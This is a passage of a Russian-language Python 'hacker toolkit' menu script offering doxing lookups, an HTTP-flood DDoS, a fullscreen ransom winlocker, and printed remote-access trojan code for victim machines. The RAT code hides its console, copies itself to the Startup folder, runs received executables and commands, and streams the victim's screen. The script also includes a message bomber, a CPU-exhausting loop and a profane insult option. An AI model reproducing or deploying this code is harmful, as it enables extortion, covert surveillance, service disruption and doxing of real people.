▓██░  ██▒▒████▄    ▓██ ▒ ██▒▒████▄    ▒██▀ ██▌▒██▒  ██▒▒▒ █ █ ▒░
▓██░ ██▓▒▒██  ▀█▄  ▓██ ░▄█ ▒▒██  ▀█▄  ░██   █▌▒██░  ██▒░░  █   ░
▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██▀▀█▄  ░██▄▄▄▄██ ░▓█▄   ▌▒██   ██░ ░ █ █ ▒ 
▒██▒ ░  ░ ▓█   ▓██▒░██▓ ▒██▒ ▓█   ▓██▒░▒████▓ ░ ████▓▒░▒██▒ ▒██▒
▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░ ▒▒   ▓▒█░ ▒▒▓  ▒ ░ ▒░▒░▒░ ▒▒ ░ ░▓ ░
░▒ ░       ▒   ▒▒ ░  ░▒ ░ ▒░  ▒   ▒▒ ░ ░ ▒  ▒   ░ ▒ ▒░ ░░   ░▒ ░
░░         ░   ▒     ░░   ░   ░   ▒    ░ ░  ░ ░ ░ ░ ▒   ░    ░  
               ░  ░   ░           ░  ░   ░        ░ ░   ░    ░  
                                       ░  

[!]запрос -> {phone}                                               
[+]Страна -> {country}
[+]Полное название страны -> {country_fullname}
[+]Название страны на английском -> {country_english}
[+]Код страны (3 символа) -> {country_code3}
[+]ISO код страны -> {country_iso}
[+]Телефонный код страны: ->{country_telcod}
[+]Локация страны -> {country_location}
[+]Столица страны -> {country_capital}
[+]MCC страны -> {country_mcc}
[+]Язык страны -> {country_lang}
[+]Код языка страны -> {country_langcod}
[+]Регион -> {region}
[+]ID региона -> {region_id}
[+]Округ региона -> {region_okrug}
[+]Автокод региона -> {region_autocod}
[+]Столица региона -> {region_capital}
[+]Название региона на английском: {region_english}
[+]ISO код региона -> {region_iso}
[+]Оператор -> {operator}
[+]Код оператора -> {telcod}
[+]Широта -> {latitude}
[+]Долгота -> {longitude}
[+]Часовой пояс -> {time_zone}
[+]Временная зона -> {tz}
[+]Тип -> {mobile}
[+]Бренд оператора -> {operator_brand}
[+]Диапазон DEF -> {def_range}                                                                                                                                   
"""
        return result
    else:
        return "Данных по номеру не найдено."
    
multiline_text = """
000   00     000       000     00              0000000000000000
000  00      000       000     00              000          000
000 00       000       000     00              000          000
0000         000       000     00              0000000000000000
0000         000       000     00              000          000
000 00       000       000     00              000          000
000  00      0000000000000     00000000000     000          000
      
функционал:
 _____________________________________________________________________________________________________
| [1] - осинт    [2] - бд поиск    [3] - Ddos    [4] - винлокер с откупом   [5] - рат с запуском      |
| приложений   [6] - рат без запуска приложений, но с отслеживанием экрана                            |
| [7] - информация о себе   [8] - vpn   [9] - информация о инструменте   [10] - бомбер сообщениями    |
| [11] - установить библиотеку если через pip install не получается   [12] - майнер   [13] - cmd      |
| [14] - поиск по номеру   [15] - троллинг  [16] - поиск по тг-юзернейму   [17] - поиск по IP         |
| [18] - запустить Anubis   [19] - запустить DeadOsint   [20] - выход                                 |
|_____________________________________________________________________________________________________|"""
import os
os.system('cls')
print_multiline_centered(multiline_text)

num = input("[?] введите номер функции: ") 
if num == "1":
    import webbrowser
    print(Fore.GREEN + """
          доступные соцсети:
          телеграм
          тик ток
          гугл(поиск во всех соцсетях) 
          или вы можете сделать поиск по номеру телефона(чтобы это сделать введите слово телефон)
          """)
    soc = input("введите соцсеть или введите слово телефон: ")
    if soc == "телеграмм":
        nic = input("введите юзернейм: ")
        search_url = f"https://www.google.com/search?q=telegramm {nic}"
        webbrowser.open(search_url)
    elif soc == "тик ток":
        nic2 = input("введите юзернейм с @: ")
        search_url = f"https://www.google.com/search?q=tik tok {nic2}"
        webbrowser.open(search_url)
    elif soc == "гугл":
        nic3 = input("введите ник или юзернейм из любой соцсети: ")
        search_url = f"https://www.google.com/search?q={nic3}"
        webbrowser.open(search_url)
    elif soc == "телефон":
        url = "https://www.kody.su/check-tel#text"
        webbrowser.open(url)
elif num == "2":
    import sqlite3
    import time
    print("в коде замените данные на вашу бд(путь, столбец и т.д)")
    conn = sqlite3.connect(r"C:\Users\User\Downloads\doxkit.db")
    cursor = conn.cursor()

    def найти_совпадения(ключевое_слово):
        cursor.execute("SELECT * FROM dox WHERE name LIKE ?", ('%' + ключевое_слово + '%',))
        результаты = cursor.fetchall()
        return результаты

    ключ = input("Введите часть имени или слова для поиска: ")
    совпадения = найти_совпадения(ключ)

    if совпадения:
        print("Найден(ы):")
        for совпадение in совпадения:
            print(совпадение)
            time.sleep(10)
            print
    else:
        print("Совпадений не найдено")
        time.sleep(10)
        print

elif num == "3":
    import pystyle
    from pystyle import Colorate, Colors
    import random
    import requests
    import threading
    url = pystyle.Write.Input("[?] URL: ", pystyle.Colors.green, interval=0.005)
    num_requests = int(
                    pystyle.Write.Input(
                        "[?] Введите количество запросов: ", pystyle.Colors.green, interval=0.005
                    )
                )
    user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
                    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
                ]
    def send_request(i):
                    user_agent = random.choice(user_agents)
                    headers = {"User-Agent": user_agent}
                    try:
                        response = requests.get(url, headers=headers)
                        print(f"[+] Request {i} sent successfully\n")
                    except:
                        print(f"[+] Request {i} sent successfully\n")
    threads = []
    for i in range(1, num_requests + 1):
        t = threading.Thread(target=send_request, args=[i])
        t.start()
        threads.append(t)
    for t in threads:
                    t.join()

elif num == "4":
    pas = input("введите пароль для винлокера: ")
    nik = input("введите куда написать для откупа: ")
    cem = input("введите кем будет заблокан виндовс: ")
    import tkinter as tk
    import os
    from tkinter import messagebox
    import ctypes
    import time

    print(r"""
error: ox0374582
error: 0x34769432
error: 0x017238""")
    time.sleep(1)
    print(r"""error: 0x675825637
error: 0x63836426""")
    time.sleep(0.5)
    print('Ecryptor started')
    time.sleep(1)
    os.system('cls' if os.name == 'nt' else 'clear')
    print(r"""
            ;::::; 
           ;::::; :; 
         ;:::::'   :; 
        ;:::::;     ;. 
       ,:::::'       ;           OOO\ 
       ::::::;       ;          OOOOO\ 
       ;:::::;       ;         OOOOOOOO 
      ,;::::::;     ;'         / OOOOOOO 
    ;:::::::::`. ,,,;.        /  / DOOOOOO 
  .';:::::::::::::::::;,     /  /     DOOOO 
,::::::;::::::;;;;::::;,   /  /        DOOO 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO 
::`:::::::`;:::::::: ;::::# /              DOO 
`:`:::::::`;:::::;;::: ;::#               DOO 
:::`:::::::`;; ;:::::::::##                OO 
::::`:::::::`;::::::::;:::#                OO 
`:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:# 
   ::::::`:::::;'  /  /   `#
      """)

    time.sleep(0.5)

    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

    def check_input(event=None):
        user_input = entry.get().strip() 
        if user_input == f"{pas}":  
            messagebox.showinfo("Доступ разблокирован!", "Вы разблокировали доступ к системе! Нажмите ОК для закрытия блокировщика.\nПользуйтесь : )")
            root.destroy() 
        else:
             messagebox.showinfo("упс!", "неверный пароль!")

    root = tk.Tk()
    root.title("black hat winlocker")

    root.attributes("-fullscreen", True)
    root.configure(bg="blue")
    root.attributes("-topmost", True)

    root.protocol("WM_DELETE_WINDOW", lambda: None)

    label = tk.Label(root, text=f"ваш виндовс заблокирован {cem}", foreground="white", background="blue", font=("Arial", 35))
    label.pack(pady=20)

    entry = tk.Entry(root, show="*", width=30, font=("Arial", 25))
    entry.pack(pady=10)

    entry.bind("<Return>", check_input)

    button = tk.Button(root, text="подтвердить", command=check_input)
    button.pack(pady=5)

    label = tk.Label(
        root,
        text="вас заметили",
        foreground="white",        
        background="blue",  
        font=("Arial", 70),
        padx=10,
        pady=10
    )
    label.pack()

    label = tk.Label(
        root,
        text="👁",
        foreground="white",        
        background="blue",  
        font=("Arial", 70),
        padx=10,
        pady=10
    )
    label.pack()

    label = tk.Label(
        root,
        text="""
    упс! вы подверглись хакерской атаке и ваши файлы были зашифрованы!
    пока ваш компьютер находится в этом состоянии вы ничего не сможете сделать.
    Любая попытка обхода вируса карается повторным запуском вируса!""",
        foreground="white",        
        background="blue",  
        font=("Arial", 30),
        padx=10,
        pady=10
    )
    label.pack()

    label = tk.Label(
        root,
        text=f"""
    для откупа вы можете связатся с нами
    писать нужно в социальную сеть telegram
    юзернейм автора {nik}""",
        foreground="white",        
        background="blue",  
        font=("Arial", 30),
        padx=10,
        pady=10
    )

    label.pack()

    root.mainloop()

elif num == "5":
    print("код для чужого пк:")
    print("""import socket
import threading
import ctypes
import time
import os
import tkinter as tk
from tkinter import messagebox
import subprocess
import webbrowser
import shutil
import sys

window_67 = None
window_block = None

ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def add_to_startup_folder():
    script_path = os.path.abspath(sys.argv[0])
    
    startup_folder = os.path.join(
        os.environ["APPDATA"],
        "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
    )
    
    try:
        shutil.copy2(script_path, startup_folder)
    except Exception as e:
         print("ошибка автозагрузки!")

def safe_shutdown_windows(delay_seconds=0):
    try:
        # shutdown /s — выключение; /t — задержка в сотнях миллисекунд; /f — принудительное закрытие программ
        cmd = ['shutdown', '/s', '/t', str(delay_seconds * 1), '/f']
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Выключение запланировано через delay_seconds} секунд")
        else:
            print(f"Ошибка: result.stderr}")
    except Exception as e:
        print(f"Исключение: e}")

def win_error(title, msg):
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror(title, msg)
    root.destroy()

MOUSEEVENTF_MOVE = 0x0001
MOUSEEVENTF_LEFTDOWN = 0x0002
MOUSEEVENTF_LEFTUP = 0x0004
MOUSEEVENTF_RIGHTDOWN = 0x0008
MOUSEEVENTF_RIGHTUP = 0x0010
MOUSEEVENTF_WHEEL = 0x0800

def move_cursor(x, y):
    
    ctypes.windll.user32.SetCursorPos(x, y)

def download_and_run_app(client_socket, file_data, filename):
    
    try:
        # Сохраняем файл во временную директорию
        temp_path = os.path.join(os.getcwd(), 'temp')
        os.makedirs(temp_path, exist_ok=True)
        file_path = os.path.join(temp_path, filename)

        with open(file_path, 'wb') as f:
            f.write(file_data)

        # Запускаем файл
        if filename.lower().endswith('.exe'):
            subprocess.Popen([file_path])
            return f"Приложение filename} запущено"
        elif filename.lower().endswith(('.py', '.pyw')):
            subprocess.Popen(['python', file_path])
            return f"Скрипт filename} запущен"
        else:
            # Для других типов файлов пытаемся открыть стандартными средствами ОС
            os.startfile(file_path)
            return f"Файл 
          filename} открыт"
    except Exception as e:
        return f"Ошибка при скачивании/запуске: {str(e)}"

def handle_client(client_socket):
    while True:
        try:
            data = client_socket.recv(1024).decode()
            if not data:
                break
            print(f"Получена команда: {data}")
            if data.startswith('download_run:'):
                # Формат: download_run:имя_файла:данные_в_hex
                parts = data.split(':', 2)
                if len(parts) == 3:
                    filename = parts[1]
                    file_data_hex = parts[2]
                    try:
                        file_data = bytes.fromhex(file_data_hex)
                        response = download_and_run_app(client_socket, file_data, filename)
                    except ValueError:
                        response = "Ошибка: неверные данные файла (не hex)"
                else:
                    response = "Ошибка: неверный формат команды"
            else:
                response = execute_command(data)

            client_socket.send(response.encode('utf-8'))
        except Exception as e:
            print(f"Ошибка обработки клиента: {e}")
            break
    client_socket.close()

def execute_command(cmd):
    global window_67, window_block
    if cmd == "курсор":
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
        move_cursor(500, 500)
        time.sleep(1)
        move_cursor(300, 400)
        time.sleep(1)
        move_cursor(600, 200)
        time.sleep(1)
    elif cmd == "выкл пк":
        safe_shutdown_windows(3)
    elif cmd == "сообщение":
        win_error("сообщение", "сообщение от некого приложения)")
    elif cmd == "калькулятор":
        os.system('calc')
    elif cmd == "диспетчер задач":
        os.system('taskmgr')
    elif cmd == "блокнот":
        os.system('notepad')
    elif cmd == "проводник":
        os.system('explorer')
    elif cmd == "cmd":
        os.system('cmd')
    elif cmd == "paint":
        os.system('mspaint')
    elif cmd == "панель управления":
        os.system('control')
    elif cmd == "клавиатура":
        os.system('osk')
    elif cmd == "гугл":
        url = "https://www.google.com"
        webbrowser.open(url)
    elif cmd == "покойо":
        url == "https://www.pocoyo.com"
        webbrowser.open(url)
    elif cmd == "18+":
        url = f"https://www.google.com/search?q=18+ с обезьянами смотреть бесплатно"
        webbrowser.open(url)
    elif cmd == "67":
        if window_67 is None or not window_67.winfo_exists():
            window_67 = tk.Toplevel()
            window_67.title("67")
            window_67.geometry("400x300")
            label = tk.Label(window_67, text="67", foreground="white", background="blue", font=("Arial", 35))
            label.pack(pady=20)
    elif cmd == "блок":
        if window_block is None or not window_block.winfo_exists():
            window_block = tk.Toplevel()
            window_block.title("Блок")
            window_block.geometry("1980x1200")
            window_block.attributes("-fullscreen", True)
            window_block.attributes("-topmost", True)
            window_block.protocol("WM_DELETE_WINDOW", lambda: None)
            label = tk.Label(window_block, text="Вас заметили 👁", foreground="white", background="black", font=("Arial", 50))
            label.pack(expand=True, fill=tk.BOTH)
    else:
        win_error("сообщение", f"{cmd}")

root = tk.Tk()
root.withdraw()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('localhost', 8888))
server.listen(5)
print("Сервер запущен, ожидает команд...")

def start_server():
 while True:
    client, addr = server.accept()
    print(f"Подключение от {addr}")
    client_handler = threading.Thread(target=handle_client, args=(client,))
    client_handler.start()

server_thread = threading.Thread(target=start_server, daemon=True)
server_thread.start()

root.mainloop()
""")
    print("не забывайте в начале некоторых мест ставить {")
    print("код на ваш пк: ")
    print("""
import socket

def send_command_to_server(command):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect(('localhost', 8888))
        client.send(command.encode())
        print(f"Команда 'command}' отправлена на сервер")
    except ConnectionRefusedError:
        print("Сервер не запущен")
    finally:
        client.close()

def send_file_to_server(filepath, filename):
    try:
        with open(filepath, 'rb') as f:
            file_data = f.read()
        # Конвертируем в hex для передачи в текстовом протоколе
        file_data_hex = file_data.hex()
        command = f"download_run:filename}:file_data_hex}"
        send_command_to_server(command)
    except FileNotFoundError:
        print(f"Файл filepath} не найден")
    except Exception as e:
        print(f"Ошибка чтения файла: e}")

while True:
    cmd = input("Команда для отправки или введите сообщение которое хотите отправить: ")
    if cmd == 'exit':
        break
    send_command_to_server(cmd)""")
    import time
    time.sleep(30)

elif num == "6":
    print("код для чужого пк: ")
    print("""import socket
import cv2
import numpy as np
import pyautogui

HOST = '0.0.0.0'  
PORT = 9999

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((HOST, PORT))
server_socket.listen(1)

print("Ожидание соединения...")

conn, addr = server_socket.accept()
print(f"Подключение от {addr}")

try:
    while True:
        screenshot = pyautogui.screenshot()
        frame = np.array(screenshot)
        encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), 50]
        result, imgencode = cv2.imencode('.jpg', frame, encode_param)
        data = imgencode.tobytes()
        size = len(data)
        conn.sendall(size.to_bytes(4, 'big'))
        conn.sendall(data)
except Exception as e:
    print("Ошибка:", e)
finally:
    conn.close()
    server_socket.close()""")
    print("код для вашего пк: ")
    print("""import socket
import cv2
import numpy as np

HOST = 'ваш айпи'  
PORT = 9999

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HOST, PORT))

try:
    while True:
        size_data = client_socket.recv(4)
        if not size_data:
            break
        size = int.from_bytes(size_data, 'big')
        data = b''
        while len(data) < size:
            data += client_socket.recv(size - len(data))
        nparr = np.frombuffer(data, np.uint8)
        img = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
        cv2.imshow('Remote Screen', img)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
except KeyboardInterrupt:
    pass
finally:
    client_socket.close()
    cv2.destroyAllWindows() """)
    print("нужны библиотеки pyautogui, open-cv, numpy")
    time.sleep(10)
    print("hello world")
elif num == "7":
    import platform
    import os
    import time

    system = platform.system()  # ОС (Windows, Linux, Darwin - для Mac)
    release = platform.release()  # Версия ОС
    version = platform.version()  # Дополнительная версия
    machine = platform.machine()  # Модель машины (например, x86_64)
    node = platform.node()  # Имя компьютера
    processor = platform.processor()  # Процессор
    user_name = os.getlogin()

    time.sleep(2)
    print(f"Операционная система: {system} {release}")
    print(f"Версия ОС: {version}")
    print(f"Модель процессора: {processor}")
    print(f"Имя компьютера: {node}")
    print(f"Имя пользователя: {user_name}")
    print(f"Модель машины: {machine}")
    time.sleep(10)
    print("hello world")
elif num == "8":
    import os
    os.system('start ADGuardVPN.exe')
elif num == "9":
    import time
    print("название: kula")
    print("создатель: k9gy")
    time.sleep(10)
    print
elif num == "10":
    for i in range(500000000):
        os.system('wscript space_test.vbs')
elif num == "11":
    import subprocess
    import sys

    def install_package(package):
        subprocess.check_call([sys.executable, "-m", "pip", "install", package])

    packages = input("введите название библиотеки: ")

    for package in packages:
        install_package(package)
elif num == "12":
    import multiprocessing
    import time
    import tkinter as tk


    def cpu_worker():
     while True:
        x = 0
        for i in range(1000000):
            x += i ** 2
        time.sleep(0.001)

    def load_all_cpu_cores():
     num_cores = multiprocessing.cpu_count()
     processes = []

     for _ in range(num_cores):
        p = multiprocessing.Process(target=cpu_worker)
        p.start()
        processes.append(p)

     for p in processes:
        p.join()

    load_all_cpu_cores()
elif num == "13":
    import os
    os.system('cmd')
elif num == "14":
    import time
    phone_number = input("введите номер телефона: ")
    result = search_by_htmlweb(phone_number)
    format_result(result)
    time.sleep(10)
elif num == "17":
    import time
    ip_address = input("Введите IP-адрес: ")
    get_ip_info(ip_address)
    time.sleep(10)
elif num == "15":
    import time
    print("ты мразота тупая будешь впитывать мои оскорбления как твоя мать еду с холодильника блять пидр ты ебучий у которого семьи нету олух")
    time.sleep(10)    
elif num == "16":
    import time
    usr = input("Введите Telegram‑юзернейм (без @): ").strip().lstrip("@")
    get_public_tg_info(usr)
    time.sleep(10)
elif num == "20":
    import sys
    sys.exit()
elif num == "18":
    anubis()
elif num == "19":
    import os
    os.system('cls')
    dedosint()
    display_menu()
else:
    print("[?]не известная команда!") 